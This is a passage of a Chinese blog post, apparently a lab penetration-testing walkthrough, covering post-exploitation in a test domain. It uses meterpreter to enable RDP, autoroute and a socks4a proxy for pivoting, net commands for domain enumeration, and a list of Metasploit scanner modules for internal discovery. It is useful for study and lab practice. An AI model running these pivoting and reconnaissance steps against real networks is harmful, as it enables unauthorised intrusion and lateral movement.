+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" srcset="/img/loading.gif" alt="image-20210511184005186"></p>
+<p>可以发现是关闭的。</p>
+<p>使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功)</p>
+<div class="hljs"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" srcset="/img/loading.gif" alt="image-20210511184531850"></p>
+<p>再次扫描就会发现3389端口已经打开</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" srcset="/img/loading.gif" alt="image-20210511184630200" style="zoom:67%;">
+
+<p>直接连接即可</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" srcset="/img/loading.gif" alt="image-20210511185014529" style="zoom:50%;">
+
+<h2 id="添加路由、挂Socks4a代理"><a href="#添加路由、挂Socks4a代理" class="headerlink" title="添加路由、挂Socks4a代理"></a>添加路由、挂Socks4a代理</h2><ul>
+<li><p>添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机</p>
+</li>
+<li><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
+</li>
+</ul>
+<p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
+<p>在获取<code>shell</code>的机器上添加路由</p>
+<div class="hljs"><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnets
+meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24
+<span class="hljs-comment"># 添加路由</span>
+meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p
+<span class="hljs-comment"># 显示路由</span>
+meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
+<span class="hljs-comment"># 删除</span></code></pre></div>
+
+<p>使用<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>，查看存活的主机</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" srcset="/img/loading.gif" alt="image-20210511193307727" style="zoom:67%;">
+
+<p>然后建立<code>socks4</code>代理</p>
+<div class="hljs"><pre><code class="hljs pgsql">meterpreter &gt; background
+msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4a
+msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
+msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>
+msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre></div>
+
+
+
+<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" srcset="/img/loading.gif" alt="image-20210511195019515"></p>
+<p>设置完代理后攻击者主机就可以访问内网了</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><div class="hljs"><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器</span>
+net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>
+net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>
+net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#查看域内所有的主机名</span>
+net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#查看域管理员</span>
+net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#查看域控</span></code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" srcset="/img/loading.gif" alt="image-20210511200502702"></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" srcset="/img/loading.gif" alt="image-20210511200553874"></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" srcset="/img/loading.gif" alt="image-20210511200623757"></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" srcset="/img/loading.gif" alt="image-20210511200650884"></p>
+<p>汇总</p>
+<p>从域信息收集可以得到以下信息：</p>
+<ul>
+<li><p>域：god.org</p>
+</li>
+<li><p>域内有三个用户：administrator、ligang、liukaifeng01</p>
+</li>
+<li><p>域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1</p>
+</li>
+<li><p>域控：OWA(192.168.52.138)</p>
+</li>
+<li><p>域管理员：administrator</p>
+</li>
+</ul>
+<p>由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。</p>
+<h1 id="内网主机信息收集"><a href="#内网主机信息收集" class="headerlink" title="内网主机信息收集"></a>内网主机信息收集</h1><p>远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机</p>
+<p>当然之前已经设置完代理了，也可以使用kali中的msf探测</p>
+<h2 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h2><p>在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/92556219">后渗透阶段之基于MSF的内网主机探测</a></p>
+<div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span></code></pre></div>
+
+
+
+<h2 id="内网存活主机端口扫描"><a href="#内网存活主机端口扫描" class="headerlink" title="内网存活主机端口扫描"></a>内网存活主机端口扫描</h2><p><strong>使用MSF自带模块进行端口探测</strong></p>
+<div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描(默认扫描1-10000)</span></code></pre></div>
+
+<p><strong>也可以用nmap扫描</strong></p>
+<h2 id="内网存活主机服务探测"><a href="#内网存活主机服务探测" class="headerlink" title="内网存活主机服务探测"></a>内网存活主机服务探测</h2><div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#探测内网http服务的标题</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
+auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
+auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
+auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre></div>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/21/RSA-AES/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RSA_AES</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/02/spiderofwords/">
+                        <span class="hidden-mobile">spiderofwords</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "shentou&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
